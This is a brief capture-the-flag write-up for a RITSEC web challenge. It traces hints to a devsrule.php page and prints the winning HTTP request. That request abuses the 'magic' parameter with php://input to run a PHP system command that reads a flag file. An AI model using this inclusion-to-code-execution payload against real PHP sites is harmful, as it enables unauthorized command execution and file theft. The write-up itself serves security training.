# Description
```
fun.ritsec.club:8007

Author: jok3r
```
This challenge was built on "The Tangled Web"

# Solution
In the Stars.html file there was an additional hint to check out devsrule.php and an order to do fancy stuff there.Same challenges as The Tangled Web. See Hint on Stars.html 
> Getting remote access is so much work. Just do fancy things on devsrule.php 

There we find another message mentioning that the parameter was magic. Doing some fancy stuff resulted in the following winning payload

```http
GET /devsrule.php?magic=php://input HTTP/1.1
Host: fun.ritsec.club:8007
Connection: close
Content-Length: 43
 
<?php system(“cat /home/joker/flag.txt”);?>
```
This GET request resulted in 
>  RITSEC{WOW_THAT_WAS_A_PAIN_IN_THE_INPUT} 